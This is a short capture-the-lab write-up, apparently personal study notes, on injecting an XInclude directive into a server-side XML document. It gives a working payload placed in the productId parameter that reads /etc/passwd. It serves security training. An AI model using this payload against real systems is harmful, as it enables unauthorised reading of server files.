---
tags:
  - xxe
  - xinclude
---
# Exploiting XInclude to retrieve files

## Instructions

This lab has a "Check stock" feature that embeds the user input inside a server-side XML document that is subsequently parsed.

Because you don't control the entire XML document you can't define a DTD to launch a classic XXE attack.

To solve the lab, inject an `XInclude` statement to retrieve the contents of the `/etc/passwd` file.

??? tip "Hint"
	By default, `XInclude` will try to parse the included document as XML. Since `/etc/passwd` isn't valid XML, you will need to add an extra attribute to the `XInclude` directive to change this behavior.
## Solution

We can use the following xinclude payload to retrieve the contents of the `/etc/passwd` file. 

```text title="Working payload"
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

In repeater, place that payload as the value of the `productId` parameter and send the request. 

![](attachments/xxe-lab-7/file-20251121082956035.png)

This gets the `/etc/passwd` contents and solves the lab.

## Lesson learned

If I cannot control the entire XML document, try XInclude.